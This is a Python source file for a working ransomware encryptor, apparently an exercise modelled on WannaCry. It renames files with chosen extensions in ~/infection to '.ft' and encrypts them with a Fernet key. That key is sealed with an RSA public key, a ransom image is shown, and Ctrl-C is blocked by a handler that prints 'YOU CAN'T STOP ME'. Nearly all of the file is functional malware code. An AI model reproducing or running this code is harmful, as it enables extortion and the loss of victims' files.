from datetime import datetime
import logging
from operator import ne
import sys
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import os
import show_image
import signal

def handler(signum, frame):
    print("!!!!!!!!!     AHAHHHAHA    YOU CAN'T STOP ME !!!!!!!!!!!!!")

signal.signal(signal.SIGINT, handler)

home = os.getenv("HOME")
root = os.getcwd()

def logging (exception, need_print):
    f = open(root + '/log.txt', 'a')
    date = datetime.now()
    date = str(date)
    if need_print == 1:
        print("log file writing")
    f.write('\n%s: ' % date)
    f.write(' Error -> %s' % exception)
    f.close()

def open_doc(need_print):
    try:
        with open(".list_extenc_wannacry.txt", "r") as textfile:
            textFromFile = textfile.read()
            return(textFromFile)
    except Exception as e:
        logging(e, need_print)
        if need_print == 1:
            print("list extencion not exists")
        os._exit(os.EX_OK)

def ft_client_part(need_print):
    extencions = open_doc(need_print)
    try:
        os.chdir(home + "/infection")
    except Exception as e:
        logging(e, need_print)
        os._exit(os.EX_OK)
    if ".not_encoded.ft" in os.listdir():
        logging("folder already was encripted", need_print)
        os._exit(os.EX_OK)
    will_infect = list (filter(os.path.isfile, os.listdir(".")))
    notEncoded = ["not_encoded.ft",]
    for file in will_infect:
        name = file.split(".")
        if name[-1] != "ft" and name[-1] in extencions:
            os.rename(file, file + ".ft")
        else:
            notEncoded.append(file)
    with open(r"./.not_encoded.ft", "w") as file:
        for x in notEncoded:
            file.write(x + " ")
    will_infect_renamed = list (filter(os.path.isfile, os.listdir(".")))
    if len(will_infect_renamed) == 1:
        if need_print == 1:
            print("Nothing to infect")
        logging("Nothing to infect", need_print)
        os.remove(".not_encoded.ft")
        os._exit(os.EX_OK)
    key = Fernet.generate_key()
    f = Fernet(key)
    # print ("key", key) 
    # print ("f", f)
    for fileft in will_infect_renamed:
        if fileft in notEncoded:
            continue
        try:
            file_open = open(fileft, "rb")
            file_bits = file_open.read()
            file_open.close()
            token = f.encrypt(file_bits)
            token_bytearray = bytearray(token)
            encriped_file = open(fileft, "wb")
            encriped_file.write(token_bytearray)
            encriped_file.close()
        except Exception as e:
            logging(e,need_print)
            os.remove(".not_encoded.ft")
            os._exit(os.EX_OK)
    try:
        with open(root + "/.public.pem", "rb") as key_file:
            public_key = serialization.load_pem_public_key(
                key_file.read(),
            )
            message = (key)
            ciphertext = public_key.encrypt(
                message,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            cipherbytes = bytearray(ciphertext)
            ciperkey =  open(".ciperKey3", "wb")
            ciperkey.write(cipherbytes)
            ciperkey.close()
            if need_print == 1:
                show_image.show(root)
    except Exception as e:
        logging(e, need_print)
        exit(os._exit(os.EX_OK))
        

